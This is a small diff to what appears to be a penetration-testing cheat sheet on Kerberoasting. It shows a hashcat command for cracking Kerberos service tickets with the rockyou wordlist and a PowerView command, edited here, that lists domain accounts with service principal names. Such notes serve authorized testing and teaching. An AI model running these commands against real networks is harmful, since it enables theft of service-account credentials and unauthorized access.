@@ -55,7 +55,7 @@ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
 Extract TGS tickets
 ```powershell
 Import-Module .\PowerView.ps1
-Get-DomainUser * -spn | select samaccountname
+Get-DomainUser * -spn | select samaccountname,serviceprincipalname
 ```
 Target a specific user
 ```powershell
